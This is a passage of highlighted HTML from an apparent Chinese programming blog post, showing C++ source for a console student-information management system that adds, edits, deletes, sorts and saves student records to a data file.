class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::SORT_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    sort(Boy,Boy+K,CMP);</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;学生信息排序成功&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::MAX_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> Maxn=<span class=\"number\">0</span>,Flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;K;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(Boy[i].Score&gt;=Boy[Maxn].Score)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Maxn=i;</span><br><span class=\"line\">            Flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(Flag==<span class=\"number\">0</span>)<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;NO STUDENT&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;    学号\\t姓名\\t\\t性别\\t成绩&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>.setf(<span class=\"built_in\">std</span>::ios::left);</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;Boy[Maxn].Num&lt;&lt;<span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;setw(<span class=\"number\">8</span>)&lt;&lt;Boy[Maxn].Name;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t &quot;</span>&lt;&lt;Boy[Maxn].Sex&lt;&lt;<span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class=\"number\">2</span>)&lt;&lt;Boy[Maxn].Score&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    STU S;</span><br><span class=\"line\">    S.TITLE_STU();</span><br><span class=\"line\">    <span class=\"keyword\">int</span> choice;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;choice)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(choice==<span class=\"number\">1</span>)S.ADD_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">2</span>)S.CHANGE_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">3</span>)S.DEL_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">4</span>)S.SHOW_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">5</span>)S.SORT_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">6</span>)S.MAX_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        system(<span class=\"string\">&quot;PAUSE&amp;CLS&quot;</span>);</span><br><span class=\"line\">        S.TITLE_STU();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>文件操作:</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iomanip&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> ll;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> K = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">STU</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\tll Num;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> Name[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> Sex;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> Score;</span><br><span class=\"line\">\t<span class=\"keyword\">bool</span> flag;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">READ_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">WRITE_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">TITLE_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ADD_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">CHANGE_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DEL_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">SHOW_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">SORT_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">MAX_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">friend</span> <span class=\"keyword\">bool</span> <span class=\"title\">CMP1</span><span class=\"params\">(STU, STU)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">friend</span> <span class=\"keyword\">bool</span> <span class=\"title\">CMP2</span><span class=\"params\">(STU, STU)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">friend</span> <span class=\"keyword\">bool</span> <span class=\"title\">CMP3</span><span class=\"params\">(STU, STU)</span></span>;</span><br><span class=\"line\">\tSTU()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tflag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t~STU() &#123;&#125;</span><br><span class=\"line\">&#125;Boy[<span class=\"number\">1000</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::READ_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tFILE *fp = fopen(<span class=\"string\">&quot;STU.dat&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"built_in\">fscanf</span>(fp, <span class=\"string\">&quot;%lld %s %c %lf&quot;</span>, &amp;Boy[K].Num, &amp;Boy[K].Name, &amp;Boy[K].Sex, &amp;Boy[K].Score) != EOF)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tBoy[K].flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tK++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::WRITE_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tFILE *fp = fopen(<span class=\"string\">&quot;STU.dat&quot;</span>, <span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; K; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(Boy[i].flag==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(fp, <span class=\"string\">&quot;%lld %s %c %lf\\n&quot;</span>, Boy[i].Num, Boy[i].Name, Boy[i].Sex, Boy[i].Score);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">CMP1</span><span class=\"params\">(STU a, STU b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> a.Num&lt;b.Num;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">CMP2</span><span class=\"params\">(STU a, STU b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(a.Name,b.Name)==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> a.Num&lt;b.Num;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"built_in\">strcmp</span>(a.Name,b.Name)&lt;<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">CMP3</span><span class=\"params\">(STU a, STU b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (a.Score == b.Score)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> a.Num&lt;b.Num;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> a.Score&gt;b.Score;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::TITLE_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t1:\\tADD A STUDENT&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t2:\\tCHANGE STUDENTS\\&#x27;S INFORMATION&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t3:\\tDELETE A STUDENT&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t4:\\tSHOW STUDENTS INFORMATION&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t5:\\tSORT THE STUDENTS&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t6:\\tSHOW THE MAX SCORE\\&#x27; STUDENT&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t0:\\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"string\">&quot;\\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::ADD_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请输入要添加的学生人数&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> T; <span class=\"built_in\">cin</span> &gt;&gt; T;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请输入&quot;</span> &lt;&lt; T &lt;&lt; <span class=\"string\">&quot;行学生的学号,姓名,性别,成绩&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;T; i++, K++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; Boy[K].Num &gt;&gt; Boy[K].Name &gt;&gt; Boy[K].Sex &gt;&gt; Boy[K].Score;</span><br><span class=\"line\">\t\tBoy[K].flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"string\">&quot;学生信息导入成功&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::CHANGE_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请输入要修改的学生学号,输入0停止删除&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\tll num;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"built_in\">cin</span> &gt;&gt; num)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;K; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (num == Boy[i].Num)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请再次输入学生的学号,姓名,性别,成绩&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">cin</span> &gt;&gt; Boy[i].Num &gt;&gt; Boy[i].Name &gt;&gt; Boy[i].Sex &gt;&gt; Boy[i].Score;</span><br><span class=\"line\">\t\t\t\tBoy[i].flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t\tflag = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;学生信息修改成功&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (num == <span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (flag == <span class=\"number\">0</span>)<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;NO SUCH STUDENTS&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::DEL_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请输入要删除的学生学号,输入0停止删除&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\tll num;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"built_in\">cin</span> &gt;&gt; num)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;K; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (num == Boy[i].Num)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tBoy[i].flag = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\tflag = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;DELETE SUCCESS!&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (num == <span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (flag == <span class=\"number\">0</span>)<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;NO SUCH STUDENTS&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::SHOW_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"string\">&quot;\\tThe Lists Of Students Are Here&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;    学号\\t姓名\\t\\t性别\\t成绩&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>.setf(<span class=\"built_in\">std</span>::ios::left);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;K; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (Boy[i].flag == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; Boy[i].Num &lt;&lt; <span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; setw(<span class=\"number\">8</span>) &lt;&lt; Boy[i].Name;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t &quot;</span> &lt;&lt; Boy[i].Sex &lt;&lt; <span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(<span class=\"number\">2</span>) &lt;&lt; Boy[i].Score &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::SORT_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;1.按学号排序&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;2.按姓名排序&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span 